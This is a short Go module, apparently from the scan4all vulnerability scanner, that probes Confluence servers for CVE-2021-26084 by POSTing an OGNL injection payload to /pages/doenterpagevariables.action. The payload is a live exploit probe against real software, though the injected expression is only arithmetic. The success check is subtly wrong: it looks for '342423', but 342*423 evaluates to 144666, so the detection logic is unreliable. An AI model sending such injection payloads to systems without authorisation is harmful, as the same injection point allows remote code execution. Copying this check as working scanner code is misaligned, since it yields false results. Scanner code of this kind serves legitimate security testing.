package confluence

import (
	"github.com/GhostTroops/scan4all/lib/util"
	"strings"
)

func CVE_2021_26084(u string) bool {
	pay := "queryString=vvv\\u0027%2b#{342*423}%2b\\u0027ppp"
	if req, err := util.HttpRequset(u+"/pages/doenterpagevariables.action", "POST", pay, false, nil); err == nil {
		if strings.Contains(req.Body, "342423") {
			util.SendLog(req.RequestUrl, "CVE-2021-26084", "Found Confluence ", pay)
			return true
		}
	}
	return false
}
